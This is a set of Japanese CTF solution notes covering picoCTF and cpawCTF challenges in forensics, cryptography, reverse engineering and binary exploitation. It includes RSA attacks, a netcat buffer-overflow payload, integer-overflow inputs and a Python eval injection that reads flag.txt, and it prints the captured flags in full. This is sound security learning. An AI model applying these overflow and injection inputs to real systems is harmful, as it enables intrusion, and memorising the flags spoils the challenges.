+                                             0x0000D0BA=53434                            ファイル先頭から画像データまでのオフセット-0xE   0x0000046e=1134ピクセル  0x00000132=306
+                                             0x00000036=54                               54-14=40=0x28(前の値によって一意に決まる)                                 0x00000340=832(試行錯誤、適当)
+
+ヘッダからのファイル判別（マジックナンバーまとめ）
+https://qiita.com/forestsource/items/15933888466ba9c3f048
+
+
+[Forensics] pcapngファイルをWiresharkでファイル抽出して、ステガノされたbmpファイルからフラグを取得
+039_Forensics_Trivial Flag Transfer Protocol簡易フラグ転送プロトコル
+
+Wireshark - File - Export Objects - TFTP  　他のプロトコルではファイルを得られない
+
+instructions.txt
+GSGCQBRFAGRAPELCGBHEGENSSVPFBJRZHFGQVFTHVFRBHESYNTGENAFSRE.SVTHERBHGNJNLGBUVQRGURSYNTNAQVJVYYPURPXONPXSBEGURCYNA（ROT13）Cyberchef
+TFTPDOESNTENCRYPTOURTRAFFICSOWEMUSTDISGUISEOURFLAGTRANSFER.FIGUREOUTAWAYTOHIDETHEFLAGANDIWILLCHECKBACKFORTHEPLAN
+tftp doesn't encrypt our traffic so we must disguise our flag transfer. figure out a way to hide the flag and i will check back for the plan
+TFTP はトラフィックを暗号化しないため、フラグ転送を偽装する必要があります。フラグを非表示にする方法を見つけてください。計画を確認します
+
+plan
+VHFRQGURCEBTENZNAQUVQVGJVGU-QHRQVYVTRAPR.PURPXBHGGURCUBGBF（ROT13）Cyberchef
+IUSEDTHEPROGRAMANDHIDITWITH-DUEDILIGENCE.CHECKOUTTHEPHOTOS
+I used the program and hid it with - due diligence. check out the photos
+私はプログラムを使用し、それを隠しました-デューデリジェンス。写真をチェックしてください
+
+debファイルを解凍
+steghideという名前のフォルダがある
+
+steghideコマンドで写真にステガノされたフラグファイルflag.txtからフラグを取得（パスワードはplainにある「DUEDILIGENCE」）
+steghide extract -sf picture3.bmp
+steghide extract -sf picture3.bmp -p DUEDILIGENCE -xf output.txt
+-p パスワード
+ -sf <秘密情報を埋め込んだファイル>
+
+
+[Cryptography] JPGファイルからsteghideコマンド（パスワードなし）でファイルを抽出した後、サイトでAtbash暗号を複合する
+112_Cryptography_HideToSee隠すために見る
+
+$ steghide extract -sf 112_atbash.jpg
+Enter passphrase:
+wrote extracted data to "encrypted.txt".
+
+アトバシュ暗号の複合サイト
+https://www.dcode.fr/atbash-cipher
+
+
+[PPC] 値の並び替え
+cpawCTF\Level_1_9_[PPC]並べ替えろ!
+エクセルで並び替え
+pythonプログラム
+
+
+[PPC] 数学の総当たり
+cpawCTF\Level_3_3_[PPC]Remainder theorem.mhtml
+pythonプログラム
+x ≡ 32134 (mod 1584891)
+x ≡ 193127 (mod 3438478)
+x ＝ 35430270439
+35430270439 mod 1584891 = 32134
+35430270439 mod 3438478 = 193127
+
+
+[Crypto] RSA暗号の平文を求める（eが小さい）
+cpawCTF\Level_3_4_[Crypto] Common World.mhtml		Level_3_4_Low Public-Exponent Attack.py
+picoCTF\010_Cryptography_2_Mind your Ps and Qs.mhtml	https://www.dcode.fr/rsa-cipher
+038_Cryptography_Dachshund Attacks.mhtml		https://www.dcode.fr/rsa-cipher	
+
+平文をm,暗号文をc,公開鍵を(e,N),秘密鍵をdとする
+RSA Cipher Calculator　暗号文c,公開鍵(e,N),秘密鍵dを入力する
+https://www.dcode.fr/rsa-cipher
+
+素因数分解（参考）
+http://factordb.com/index.php?query=769457290801263793712740792519696786147248001937382943813345728685422050738403253
+769457290801263793712740792519696786147248001937382943813345728685422050738403253= 1617549722683965197900599011412144490161×475693130177488446807040098678772442581573
+
+N=236934049743116267137999082243372631809789567482083918717832642810097363305512293474568071369055296264199854438630820352634325357252399203160052660683745421710174826323192475870497319105418435646820494864987787286941817224659073497212768480618387152477878449603008187097148599534206055318807657902493850180695091646575878916531742076951110529004783428260456713315007812112632429296257313525506207087475539303737022587194108436132757979273391594299137176227924904126161234005321583720836733205639052615538054399452669637400105028428545751844036229657412844469034970807562336527158965779903175305550570647732255961850364080642984562893392375273054434538280546913977098212083374336482279710348958536764229803743404325258229707314844255917497531735251105389366176228741806064378293682890877558325834873371615135474627913981994123692172918524625407966731238257519603614744577
+
+Low Public-Exponent Attack	eが小さい数の時に使うことができる(シンプルに暗号文のe乗根をとりにいく)
+wiener attack			dが小さいとき
+
+e=11
+c=80265690974140286785447882525076768851800986505783169077080797677035805215248640465159446426193422263912423067392651719120282968933314718780685629466284745121303594495759721471318134122366715904
+N=236934049743116267137999082243372631809789567482083918717832642810097363305512293474568071369055296264199854438630820352634325357252399203160052660683745421710174826323192475870497319105418435646820494864987787286941817224659073497212768480618387152477878449603008187097148599534206055318807657902493850180695091646575878916531742076951110529004783428260456713315007812112632429296257313525506207087475539303737022587194108436132757979273391594299137176227924904126161234005321583720836733205639052615538054399452669637400105028428545751844036229657412844469034970807562336527158965779903175305550570647732255961850364080642984562893392375273054434538280546913977098212083374336482279710348958536764229803743404325258229707314844255917497531735251105389366176228741806064378293682890877558325834873371615135474627913981994123692172918524625407966731238257519603614744577
+
+ヒント
+e=13
+c=14451037575679461333658489727928902053807202350950440400755535465672646289383249206721118279217195146247129636809289035793102103248547070620691905918862697416910065303500798664102685376006097589955370023822867897020714767877873664
+N=236934049743116267137999082243372631809789567482083918717832642810097363305512293474568071369055296264199854438630820352634325357252399203160052660683745421710174826323192475870497319105418435646820494864987787286941817224659073497212768480618387152477878449603008187097148599534206055318807657902493850180695091646575878916531742076951110529004783428260456713315007812112632429296257313525506207087475539303737022587194108436132757979273391594299137176227924904126161234005321583720836733205639052615538054399452669637400105028428545751844036229657412844469034970807562336527158965779903175305550570647732255961850364080642984562893392375273054434538280546913977098212083374336482279710348958536764229803743404325258229707314844255917497531735251105389366176228741806064378293682890877558325834873371615135474627913981994123692172918524625407966731238257519603614744577
+
+Common Modulus Attack
+ヒントによってNが共通(同じ)かつeが互いに素（11,13）となるときCommon Modulus Attack
+
+RSA公開鍵(n,e1), (n,e2)と平文m、それぞれの公開鍵で暗号化した暗号文c1,c2があり、gcd(e1,e2)=1の時、N,e1,e2,c1,c2から平文mを導出することができる。
+c1=m^e1 mod N
+c2=m^e2 mod N
+ここで、e1・s1+e2・s2=1となるようなs1,s2を拡張ユークリッドの互除法によって見つけたとする。
+c1^s1・c2^s2=(m^e1)^s1・(m^e2)^s2 mod N
+= m^(e1・s1) + m^(e2・s2) mod N
+= m^(e1・s1 + e2・s2) mod N
+= m^1
+= m
+
+N=p・q(pとqは異なる素数)
+c=m^e (mod N)
+d=e^−1 (mod (p−1)(q−1))
+m=c^d (mod N) (復号時)
+
+c1=m^e (mod N)=m^11 (mod N)
+c2=m^e (mod N)=m^13 (mod N)
+c2/c1=m^2 (mod N)
+m=√c2/c1=424311244315114354
+
+与えられた2つの暗号文の割り算を実行し、その結果に対して平方根を求めればそれが平文
+
+ポリュビオスの暗号表
+  1 2 3 4   5
+1 A B C D   E
+2 F G H I,J K
+3 L M N O   P
+4 Q R S T   U
+5 V W X Y   Z
+
+ 42 43 11  24 43  15 11 43 54
+= R  S  A   I  S   E  A  S  Y
+
+
+[Crypto] RSA暗号の平文を求める
+042_Cryptography No Padding, No Problem			https://tech.kusuwada.com/entry/2021/04/08/121120
+
+C:\Users\user\Desktop\picoCTF>python 042_Cryptography Decord.py
+[x] Opening connection to mercury.picoctf.net on port 33780
+[x] Opening connection to mercury.picoctf.net on port 33780: Trying 18.189.209.142
+[+] Opening connection to mercury.picoctf.net on port 33780: Done
+117351668430020818234079132287783348879362175345825867801512548543489279571847269071889781692770316644336062362936712115225454252550593231324090052478320832607143782138104990947196507965147794186105121650105322253365979958451755221164031973675793111645415497770558048236497023591464333842746328473445257298281 65537 65518415458028921785167723513206444456002948464127031078840656069596601082145505915432445013438499424943220563088942453163892077940346456871389075722063489824971263162231736711223117206543639856908060174210784113092411728308018850398699296822963347903863961549311299866600564788699260050688674254634055575040
+--------------------------------------
+b'picoCTF{m4yb3_Th0se_m3s54g3s_4r3_difurrent_0801973}'
+[*] Closed connection to mercury.picoctf.net port 33780
+
+https://tech.kusuwada.com/entry/2021/04/08/121120
+https://github.com/zweisamkeit/RSHack
+
+
+
+
+[Misc] zipファイルからフラグを入手
+cpawCTF\Level_2_6_[Misc]Image!.mhtml
+7-zipでzipファイルを解凍
+unzip -d out test.zip　zipファイルを解凍
+fileコマンドでファイル種別を確認する
+拡張子を変更する
+
+
+[General Skills] zipファイルを解凍すると、深い階層にフラグのファイルがある（インデックス検索でファイルを探す）
+106_General Skills_First Find最初の発見
+C:\Users\user\Desktop\picoCTF\106_files\files\adequate_books\more_books\.secret\deeper_secrets\deepest_secrets
+
+[General Skills] zipファイルの解凍ファイルの最奥の階層にあるファイルにフラグ（stringsコマンド、または実行）
+picoCTF\012_General Skills_6_Tab, Tab, Attack.mhtml
+
+
+[Forensics] pptmファイルを解凍して求まったファイルの文字列をBase64復号するとフラグが求まる
+032_Forensics_MacroHard WeakEdgeマクロハード ウィークエッジ
+
+Zm x hZ z ogc G l jb 0 N UR n t EM W R fd V 9 rb j B 3X 3 B wd H N fc l 9 6M X A 1f Q
+f  l a  g  :  p i c  o C T  F { D  1 d _  u _ k  n 0 w  _ p p  t s _  r _ z  1 p 5  }
+
+
+[Forensics] 
+086_Forensics_File typesファイルタイプ
+
+$ file Flag.pdf 
+Flag.pdf: shell archive text
+
+$ ./Flag.pdf 
+x - created lock directory _sh00046.
+x - extracting flag (text)
+./Flag.pdf: 119: uudecode: not found
+restore of flag failed
+flag: MD5 check failed
+x - removed lock directory _sh00046.
+
+$ sudo apt install sharutils	# uudecodeをインストールするため
+
+$ ./Flag.pdf
+x - created lock directory _sh00046.
+x - extracting flag (text)
+x - removed lock directory _sh00046.
+
+$ ls			# 「flag」が出力される
+flag  Flag.pdf
+
+$ file flag                                       
+flag: current ar archive
+
+$ ar -v -x flag
+x - flag
+
+$ file flag
+flag: cpio archive
+
+$ mkdir tmp
+$ cpio -iv -D tmp < flag
+flag			# tmpフォルダに「flag」が出力される
+2 blocks
+
+$ ls tmp
+flag
+$ file tmp/flag
+flag: bzip2 compressed data, block size = 900k
+
+$ cd tmp
+$ bzip2 -d flag
+bzip2: Can't guess original name for flag -- using flag.out
+
+$ file flag.out
+flag.out: gzip compressed data, was "flag", last modified: Tue Mar 15 06:50:41 2022, from Unix, original size modulo 2^32 326
+
+$ mv flag flag.gzip
+$ gzip -d flag.gzip
+gzip: flag.gzip: unknown suffix -- ignored
+
+$ zcat flag.gzip 
+LZIP
+
+$ cat flag.out 
+$ zcat flag.out 
+LZIPの前のデータをバイナリエディタで削除
+
+$ lzip -v -d flag.out
+lzip: Can't guess original name for 'flag.out' -- using 'flag.out.out'
+  flag.out: done
+
+$ file flag.out.out
+flag.out.out: LZ4 compressed data (v1.4+)
+
+$ lz4 -d flag.lz4 flag.out 
+flag.lz4             : decoded 263 bytes
+
+$ file flag.out
+flag.out: LZMA compressed data, non-streamed, size 25
+
+$ lzma -d -c flag.lz > output
+
+$ file output 
+output: lzop compressed data - version 1.040, LZO1X-1, os: Unix
+
+$ lzop -d output -o flag.lzop
+
+$ file flag.lzop
+flag.lzop: lzip compressed data, version: 1
+
+$ lzip -d flag.lzop -o flag  
+
+$ file flag     
+flag: XZ compressed data
+
+$ unxz flag.xz
+
+$ ls
+flag
+
+$ file flag
+flag: ASCII text
+
+$ cat flag
+7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f
+6630725f3062326375723137795f39353063346665657d0a
+
+$ echo 7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f6630725f3062326375723137795f39353063346665657d0a | xxd -r -p
+picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_950c4fee}
+
+picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_79b01c26}
+
+
+[Forensics] pdfの黒塗り部分をコピペすると、フラグが求まる（黒塗りされていても文字列がコピーできる）
+096_Forensics_Redaction gone wrong編集が失敗しました
+Financial Report for ABC Labs, Kigali, Rwanda for the year 2021. 
+Breakdown - Just painted over in MS word. 
+ 
+Cost Benefit Analysis
+Credit Debit
+This is not the flag, keep looking
+Expenses from the 
+picoCTF{C4n_Y0u_S33_m3_fully}
+Redacted document
+
+
+[Crypto] C言語のファイルを実行して暗号解読
+cpawCTF\Level_2_7_[Crypto]Block Cipher.mhtml
+コンパイル：gcc in.c -o out
+実行：./out 暗号文　数値
+C言語のファイルの内容を見て引数（暗号文、数値）を確認する
+試しに実行させて、数値を変えて出力を見る
+
+
+[Binary Exploitation] プログラムをバッファオーバーフローさせるとフラが求まる
+080_Binary Exploitation_buffer overflow 0バッファオーバーフロー0
+配列サイズは16文字だが、20文字の文字列を引数として与えないとフラグが求まらない
+
+
+[Binary Exploitation] サイトにオーバーフローする値（2^31=2,147,483,648）を送るとフラが求まる
+125_Binary Exploitation_two-sum二和
+
+n1 > n1 + n2 OR n2 > n1 + n2
+
+nc saturn.picoctf.net 50082
+
+$ nc saturn.picoctf.net 50082
+n1 > n1 + n2 OR n2 > n1 + n2
+What two positive numbers can make this possible:
+2147483647
+1
+You entered 2147483647 and 1
+You have an integer overflow
+YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9}
+
+$ nc saturn.picoctf.net 50082
+n1 > n1 + n2 OR n2 > n1 + n2
+What two positive numbers can make this possible:
+1073741824
+1073741824
+You entered 1073741824 and 1073741824
+You have an integer overflow
+YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9}
+
+$ nc saturn.picoctf.net 50082
+n1 > n1 + n2 OR n2 > n1 + n2
+What two positive numbers can make this possible:
+2147483647
+0
+You entered 2147483647 and 0
+No overflow
+
+32ビットの int の値の範囲が-2,147,483,648 ～ 2,147,483,647
+
+
+[Binary Exploitation] C言語のソースファイルを見て、オーバーフローで値を65に書き換えるとフラグが求まる
+139_Binary Exploitation_Local Targetローカルターゲット
+
+変数numの値を65に書き換えることが出来ればflag.txtからフラグが読み出される。
+プログラムは入力をバッファオーバーフローに対して脆弱なgets()で受け取っているので、gets()をオーバーフローさせれば変数numの値を書き換えることが出来る。
+入力バッファのサイズが16バイトなので (char input[16];)、16バイトから1バイトずつ増やしながら\x41 (65) をプログラムに送り続けたところ、\x41を25バイト送った時点で変数numが書き換えられて、フラグを取ることが出来た。
+
+$ echo -e '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41' | nc saturn.picoctf.net 50154
+Enter a string:
+num is 65
+You win!
+picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
+
+-e	数字で渡したASCIIコードを文字に変換する事が出来る（エスケープシーケンスを解釈する）
+
+$ nc saturn.picoctf.net 50154
+Enter a string: 6565656565656565656565656565656565656565656565656565
+num is 892745014
+Bye!
+
+
+[General Skills] Pythonのファイルを実行して暗号解読
+picoCTF\004_picoCTF\General_Skills_2_Python Wrangling.mhtml
+引数なし、-hなどを実行して出力を見る、ソースを見て引数を推定する
+
+
+[Cryptography] Pythonのソースコードを解析して暗号化されたフラグを復号して取得
+flag = "redacted"
+key = "redacted"
+暗号化されたフラグ = igjfihkehhkeiik
+
+暗号化されたフラグ（復号対象）
+dcebcmebecamcmanaedbacdaanafagapdaaoabaaafdbapdpaaapadanandcafaadbdaapdpandcac
+
+平文を１バイト (8ビット)ずつ取り出しビットに変換
+ -> 平文の上位4ビットを整数に変換して変数ALPHABETのインデックスとして使用し、変数ALPHABETから取り出されたアルファベットを変数encに連結
+　　平文の下位4ビットを整数に変換して変数ALPHABETのインデックスとして使用し、変数ALPHABETから取り出されたアルファベットを変数encに連結
+よって平文を1バイト エンコードするとエンコード後のデータは2バイトとなる。
+
+変数ALPHABET (小文字のアルファベット a~pが格納されている)
+
+エンコード後のフラグを1バイトずつ取り出し、任意の鍵を元にバイトをこねくり回して暗号化する
+ただし、使用される鍵のサイズは1バイトで小文字のアルファベットa~pのいずれか
+
+最終的な暗号化に使用される暗号鍵は1バイトで、しかも小文字のアルファベットa~pのいずれかと限定されているので、デコード処理と復号処理を正しく書ければ鍵を総当たりすることでフラグを取れる
+
+復号結果（16通り）
+ËÚµÚÛµÌËÇÊÈÊÊÊËÇÉ
+ºÉ¤ÉÊ¤»º¶¹·¹¹¹º¶¸
+©¸¸¹sy{vwªx©{u¥t{wz¨w¦u¨u}¨¨©xv{}¥§tw
+§§¨bhjefgjdcjfifddlgejlcf
+qQqWYTUVYSRYUXUSS[VTY[RU
+v`@`FHCDwEvHBrAHDGuDsBuBJuuvECHJrtAD
+et_tu?_5723f4e71a0736d3b1d19dde4279ac03
+TcNcd.N$&!"U#T& P/&"%S"Q S (SST#!&(PR/"
+CR=RS=DCOB@BBBCOA
+  1 ?1112>0
+!001ûñóþÿ"ð!óý-üóÿò ÿ.ý ýõ  !ðþóõ-/üÿ// ê
+àâíîïâìëâîáîììäïíâäëî
+ÚÝùÙùßÑÜÝ ÞÑÛÚÑÝÐÝÛÛÓÞÜÑÓ
+ÈèÎÀËÌÿÍþÀÊúÉÀÌÏýÌûÊýÊÂýýþÍËÀÂúüÉÌ
+íü×üý·×½¿º»î¼í¿¹é¸¿»¾ì»ê¹ì¹±ììí¼º¿±éë¸»
+ÜëÆëì¦Æ¬®©ªÝ«Ü®¨Ø§®ª­ÛªÙ¨Û¨ ÛÛÜ«©® ØÚ§ª
+
+picoCTF{et_tu?_5723f4e71a0736d3b1d19dde4279ac03}
+
+
+[Cryptography] 与えられるpytohnコードから処理を読み取り、フラグと一致するほど圧縮率が高くなるのを利用して、プログラムで総当たりしてフラグを求める（プログラムの原理不明）
+151_Cryptography_Compress and Attack圧縮して攻撃する
+
+フラグをpicoCTF{hogehoge}だと仮定する。
+ここでpicoCTF{a、picoCTF{b、picoCTF{hの3つの文字列をフラグの後ろに追加し圧縮すると
+picoCTF{hを圧縮したものの長さが25であることに対して残りの２つの長さは26となる。
+ここから、フラグと一致する部分が多いほど圧縮率が高くなり、データが短くなると推測できる。
+これを利用すると総当りで1文字ずつフラグを特定することができます。
+
+
+
+[Reverse Engineering] pythonのファイルの中を見てif文に合致する文字列を入力するとフラグが求まる（if文自体をコメントアウトしてもフラグが求まる）
+094_Reverse Engineering_patchme.py
+ak98-=90adfjhgj321sleuth9000	"ak98" + \ "-=90" + \"adfjhgj321" + \　"sleuth9000"
+
+
+[Reverse Engineering] Pythonのファイルを実行して動作を読み取ってフラグを取得
+picoCTF\013_Reverse Engineering_2_keygenme-py.mhtml
+SHA-256(MORTON)=281f75c0145b05e6ccbeecc66a61614d8c974c1a49356c118fcbab4735862fea
+print(hashlib.sha256(username_trial.encode('utf-8')).hexdigest()[4]) 7  SHA-256(MORTON)の左から5文字目
+print(hashlib.sha256(username_trial.encode('utf-8')).hexdigest()[5]) 5  SHA-256(MORTON)の左から6文字目
+print(hashlib.sha256(username_trial.encode('utf-8')).hexdigest()[3]) f
+print(hashlib.sha256(username_trial.encode('utf-8')).hexdigest()[6]) c
+print(hashlib.sha256(username_trial.encode('utf-8')).hexdigest()[2]) 1
+print(hashlib.sha256(username_trial.encode('utf-8')).hexdigest()[7]) 0
+print(hashlib.sha256(username_trial.encode('utf-8')).hexdigest()[1]) 8
+print(hashlib.sha256(username_trial.encode('utf-8')).hexdigest()[8]) 1
+
+picoCTF{1n_7h3_|<3y_of_xxxxxxxx}
+picoCTF{1n_7h3_|<3y_of_75fc1081}
+
+
+[General Skill] pythonのファイルでフラグを表示する関数が使われていないので、その関数を実行するようソースコードを変更して実行するとフラグが求まる
+076_General Skills_Serpentineサーペンタイン
+Oops! I must have misplaced the print_flag function! Check my source code!
+おっとっと！print_flag関数を間違えてしまったようです！私のソースコードを確認してください！
+
+
+[Reverse Engineering] pythonファイルに平文を出力するコードを追加して実行するとフラグが求まる
+104_Reverse Engineering_unpackme.py
+
+$ python 104_unpackme.flag_modify.py
+pw = input('What\'s the password? ')
+if pw == 'batteryhorse':
+  print('picoCTF{175_chr157m45_cd82f94c}')
+else:
+  print('That password is incorrect.')
+
+$ python 104_unpackme.flag_modify.py
+b"\npw = input('What\\'s the password? ')\n\nif pw == 'batteryhorse':\n  print('picoCTF{175_chr157m45_cd82f94c}')\nelse:\n  print('That password is incorrect.')\n\n"
+What's the password? batteryhorse
+picoCTF{175_chr157m45_cd82f94c}
+
+
+[Reverse Engineering] pythonのプログラムを実行して、プログラムの関数winを入力すると文字列が求まり、それをCyberchefでFrom Hexするとフラグが求まる
+140_Reverse Engineering_Picker Iピッカー I
+
+$ nc saturn.picoctf.net 52418
+Try entering "getRandomNumber" without the double quotes...
+==> getRandomNumber
+4
+Try entering "getRandomNumber" without the double quotes...
+==> win
+0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x62 0x35 0x32 0x33 0x62 0x32 0x61 0x31 0x7d
+Try entering "getRandomNumber" without the double quotes...
+
+
+[Reverse Engineering] pythonの関数を入力すると、それが実行される脆弱性がpythonプログラムあり、それでフラグが求まる
+141_Reverse Engineering_Picker IIピッカー II
+
+入力にwinという文字列が含まれていた場合、入力が弾かれてしまいwin()関数を実行できない
+プログラムには以下のOSコマンド・インジェクションの脆弱性があり、ユーザーは任意のPythonコマンドを実行することが出来る
+eval(user_input + '()')
+
+>>> eval('1 + 2')	引数を式として評価
+3
+
+$ nc saturn.picoctf.net 50196
+==> 1
+'int' object is not callable
+==> a
+name 'a' is not defined
+==> win
+Illegal input
+==> print(open('flag.txt', 'r').read())
+picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
+'NoneType' object is not callable
+==> open('flag.txt', 'r').read()
+'str' object is not callable
+
+
+[Reverse Engineering] 入力すると16数の値が出力され、それをCyberchefでFrom Hexするとフラグが求まる（原理不明）
+142_Reverse Engineering_Picker IIIピッカー III
+
+ユーザーが1というコマンドを指定した場合、func_tableの1番目に格納されているprint_table関数が実行される
+ユーザーが2というコマンドを指定した場合、func_tableの2番目に格納されているread_variable関数が実行される
+ユーザーが3というコマンドを指定した場合、func_tableの3番目に格納されているwrite_variable
+ユーザーが4というコマンドを指定した場合、func_tableの4番目に格納されているgetRandomNumber
+
+変数func_tableの先頭にwinを書き込んだ後に、1というコマンドを実行すればwin()が実行されてフラグを取れる
+
+変数func_tableは以下の条件を満たしていなければならない。
+・格納される関数名の数は4つ。
+・変数に格納されるデータサイズは128バイト。
+
+変数func_tableに以下の値を書き込む
+'win                     read_variable                   write_variable                  getRandomNumber                         '
+
+>>> len('win                     read_variable                   write_variable                  getRandomNumber                         ')
+128
+
+変数func_tableの値を上書きした後に1というコマンドを実行したところ、win()が実行されてHexエンコードされたフラグが読み出された。
+
+$ nc saturn.picoctf.net 60822
+==> 2
+Please enter variable name to read: func_table
+print_table                     read_variable                   write_variable                  getRandomNumber
+==> 3
+Please enter variable name to write: func_table
+Please enter new value of variable: 'win                     read_variable                   write_variable                  getRandomNumber                         '
+==> 1
+0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x63 0x32 0x30 0x66 0x35 0x32 0x32 0x32 0x7d
+
+
+[Reverse Engineering] 実行ファイルをghidraで逆コンパイルしてwin()のアドレス0x40129eを送るとフラグが求まる
+143_Reverse Engineering_Picker IVピッカー IV
+
+$ nc saturn.picoctf.net 54234
+Enter the address in hex to jump to, excluding '0x': 0x40129e
+You input 0x40129e
+You won!
+picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
+
+入力値としてwin()のアドレス0x40129eを送ったところ、フラグを取れた。
+
+ヒント 
+winにあるアドレスはどうやって見つけることができますか?
+
+
+[Reverse Engineering] 実行ファイルをghidraで逆コンパイルして、鍵と暗号文をXORして平文を求め、鍵（md5でハッシュ化された）の平文を求めるとフラグが求まる
+147_Reverse Engineering_gogoゴーゴー
+
+鍵　     3836313833366631336533643632376466613337356264623833383932313465
+鍵(Hex)　861836f13e3d627dfa375bdb8389214e
+
+暗号文　 4a53475d414503545d025a0a5357450d05005d555410010e4155574b45504601
+
+鍵 XOR 暗号文
+(Hex)    72657665727365656e67696e6565726963616e626172656c79666f7277617264
+(Ascii)  reverseengineericanbarelyforward
+
+$ nc mercury.picoctf.net 34256
+Enter Password: reverseengineericanbarelyforward
+=========================================
+This challenge is interrupted by psociety
+What is the unhashed key?
+goldfish
+Flag is:  picoCTF{p1kap1ka_p1c02e7cc205}
+
+md5のクラック 又は ハッシュ値をGoogle検索
+https://crackstation.net/
+
+鍵(Hex)　861836f13e3d627dfa375bdb8389214e
+md5(鍵)  goldfish
+md5(goldfish) = 861836f13e3d627dfa375bdb8389214e
+
+
+
+[Binary Exploitatio] C言語のファイルを実行して、予期しない入力（数字の代わりに文字を入力）するとフラグが求まる
+077_Binary Exploitation_basic-file-exploit基本ファイルエクスプロイト
+Type '1' to enter a phrase into our database
+Type '2' to echo a phrase in our database
+Type '3' to exit the program
+1'を入力すると、データベースにフレーズが入力されます。
+2'を入力すると、データベース内のフレーズをエコーします。
+3'を入力すると、プログラムを終了する
+1  # 最初は1を入力しておかないといけない
+1
+Please enter your data:
+1  # なんでもよい
+1
+Please enter the length of your data:
+2　# なんでもよい
+2
+Your entry number is: 1
+Write successful, would you like to do anything else?
+2  # 1～3を入力しろ、という意味
+2
+Please enter the entry number of your data:
+a　# 文字を入力するとフラグが求まる
+a
+picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}
+
+
+[General Skill] 16進数をアスキーコードに変換するとフラグが求まる
+068_General Skills_Glitch Catグリッチキャット
+picoCTF{gl17ch_m3_n07_' + chr(0x62) + chr(0x64) + chr(0x61) + chr(0x36) + chr(0x38) + chr(0x66) + chr(0x37) + chr(0x35) + '}
+bda68f75
+picoCTF{gl17ch_m3_n07_bda68f75}
+
+[General Skill] 16進数をアスキーコードに変換するとフラグが求まる
+071_General Skills_PW Crack 2PWクラック2
+Please enter correct password for flag: 39ce
+Welcome back... your flag, user:
+picoCTF{tr45h_51ng1ng_502ec42e}
+
+[General Skill] pythonを実行するとフラグが求まる
+064_General Skills_Codebook.mhtml
+
+[General Skill] 10進数の2進数を求めるとフラグが求まる
+065_General Skills_convertme.py
+93
+1011101
+
+
+[Cryptography] 換え字暗号（数字を数字と文字に置き換える）
+078_Cryptography_basic-mod1基本-mod1
+mod37した後、0～25=A～Z、26～35=0～9、36=_
+Excelで「=MOD(X,37)」
+
+[Cryptography] 換え字暗号（数字を数字と文字に置き換える）
+078_Cryptography_basic-mod1基本-mod1
+41のモジュラ逆数にした後、で0～25=A～Z、26～35=0～9、36=_
+Pythonで「pow(X,-1,41)」
+
+[Cryptography] 換え字暗号（数字を数字と文字に置き換える、頻度が最も高いものはe、theなどで推定）
+100_Cryptography_substitution0置換0
+
+Frequency Analysis Tool
+https://wilsoa.github.io/gallery/frequency_analysis.html
+
+冒頭の「DECKFMYIQJRWTZPXGNABUSOLVH 」は「abcdefghijklmnopqrstuvwxyz 」
+abcdefghijklmnopqrstuvwxyz 
+
+xqcpCBM{5UE5717U710Z_3S0WU710Z_59533D2F}
+picoctf{5ub5717u710n_3v0lu710n_59533a2e}
+
+hereupon legrand arose, with a grave and stately air, and brought me the beetle from a glass case in which it was enclosed. 
+it was a beautiful scarabaeus, and, at that time, unknown to naturalists—of course a great prize in a scientific point of view. 
+there were two round black spots near one extremity of the back, and a long one near the other. 
+the scales were exceedingly hard and glossy, with all the appearance of burnished gold. 
+the weight of the insect was very remarkable, and, taking all things into consideration, i could hardly blame jupiter for his opinion respecting it. 
+the flag is: picoctf{5ub5717u710n_3v0lu710n_59533a2e}
+
+
+[Cryptography] 換え字暗号（数字を数字と文字に置き換える、1文字ごとツールに打ち込んで、合っているか推定していく、何文字かは出てこないので完全なあてずっぽう）
+101_Cryptography_substitution1置換1
+picoctf{fr3Au3ncy_4774cI5_4r3_c001_6e0659fb}
+jkqxz      X           X
+picoCTF{FR3QU3NCY_4774CK5_4R3_C001_6E0659FB}
+
+LKOb (bwvek ove lgqkhej kwj osgx) gej g kyqj vo lvrqhkje bjlhetky lvrqjktktvu. Lvukjbkgukb gej qejbjukjz dtkw g bjk vo lwgssjuxjb dwtlw kjbk kwjte lejgktftky, kjlwutlgs (guz xvvxstux) bitssb, guz qevmsjr-bvsftux gmtstky. Lwgssjuxjb hbhgssy lvfje g uhrmje vo lgkjxvetjb, guz dwju bvsfjz, jglw ytjszb g bketux (lgssjz g osgx) dwtlw tb bhmrtkkjz kv gu vustuj blvetux bjeftlj. LKOb gej g xejgk dgy kv sjgeu g dtzj geegy vo lvrqhkje bjlhetky bitssb tu g bgoj, sjxgs juftevurjuk, guz gej wvbkjz guz qsgyjz my rguy bjlhetky xevhqb gevhuz kwj dvesz ove ohu guz qeglktlj. Ove kwtb qevmsjr, kwj osgx tb: 
+ctfs (short for capture the flag) are a type of computer security competition. contestants are presented with a set of challenges which test their creativity, technical (and googling) sIills, and problem-solving ability. challenges usually cover a number of categories, and when solved, each yields a string (called a flag) which is submitted to an online scoring service. ctfs are a great way to learn a wide array of computer security sIills in a safe, legal environment, and are hosted and played by many security groups around the world for fun and practice. for this problem, the flag is: 
+
+
